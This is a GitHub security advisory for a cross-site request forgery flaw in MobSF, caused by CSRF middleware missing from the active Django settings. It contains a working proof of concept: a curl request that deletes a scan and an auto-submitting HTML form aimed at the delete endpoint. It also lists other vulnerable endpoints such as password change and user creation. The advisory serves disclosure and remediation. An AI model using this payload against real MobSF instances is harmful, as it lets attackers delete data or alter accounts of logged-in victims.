# [M] MobSF's CSRF checks not enforced after Django migration

## Summary
Severity: Medium
Advisory: GHSA-3p54-567p-2wpr
CVE: CVE-2026-68923
CWE: CWE-352
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-08-18
Source: https://github.com/advisories/GHSA-3p54-567p-2wpr
Type: github-advisory

## Affected
- PyPI: `mobsf` — affected >=0 <4.5.1

## Details
### Summary

Django's `CsrfViewMiddleware` exists only in the deprecated `MIDDLEWARE_CLASSES` (ignored since Django 2.0). The active `MIDDLEWARE` tuple does not include it. All authenticated web POST endpoints (delete scan, upload, download APK, change password, manage users) accept requests without CSRF tokens.

### Verified Impact

This was verified by **actually deleting a real scan** from the running server using only a session cookie — no CSRF token was required:

```
$ curl -s -b cookies.txt -X POST "http://127.0.0.1:8000/delete_scan/" \
    -d "md5=68e76627798d62555d5287f4488a32c7&scan_type=apk"
{"deleted": "yes"}
```

The scan was removed from the database. This attack works from any website via HTML form auto-submission because:
- **No CSRF token is validated** (middleware absent)
- **Cookie `SameSite=Lax`** allows form-based top-level navigation to send the session cookie

### Affected Component

```
File: mobsf/MobSF/settings.py (Lines 206-212)

MIDDLEWARE = (
    'mobsf.MobSF.views.api.api_middleware.RestApiAuthMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    # MISSING: 'django.middleware.csrf.CsrfViewMiddleware'
)
```

### Steps to Reproduce

**1.** Start MobSF v4.4.6 and log in at `http://127.0.0.1:8000/login/` (creds: `mobsf/mobsf`).

**2.** Upload and scan any APK to create a scan entry. Note the MD5 hash from "Recent Scans".

**3.** Open the following HTML file in the **same browser** (simulates visiting attacker's page):

```html
<!DOCTYPE html>
<html>
<head><title>Innocent Page</title></head>
<body>
<h1>Loading...</h1>
<form id="f" method="POST" action="http://127.0.0.1:8000/delete_scan/">
  <input type="hidden" name="md5" value="PUT_REAL_MD5_HASH_HERE" />
  <input type="hidden" name="scan_type" value="apk" />
</form>
<script>document.getElementById('f').submit();</script>
</body>
</html>
```

**4.** The scan is deleted. Navigate back to MobSF "Recent Scans" to confirm it's gone.

### Why This Is Not a Self-Bug

- The attack requires a **victim user** who is logged in to visit an attacker-controlled page
- The attacker crafts the form targeting the victim's MobSF instance
- All destructive POST endpoints are affected: `/delete_scan/`, `/upload/`, `/download_scan/`, `/change_password/`, `/create_user/`, `/delete_user/`
- This matches the pattern of previously accepted MobSF advisories (e.g., GHSA-5jc6-h9w7-jm3p, GHSA-8m9j-2f32-2vx4)

### Remediation

Add `'django.middleware.csrf.CsrfViewMiddleware'` to the active `MIDDLEWARE` tuple.

## References
- https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-3p54-567p-2wpr
- https://github.com/MobSF/Mobile-Security-Framework-MobSF/pull/2627
- https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/62563ca429a75b3e5d47a13b958e1d2e7d5e2bbf
- https://github.com/MobSF/Mobile-Security-Framework-MobSF
- https://github.com/MobSF/Mobile-Security-Framework-MobSF/releases/tag/v4.5.1
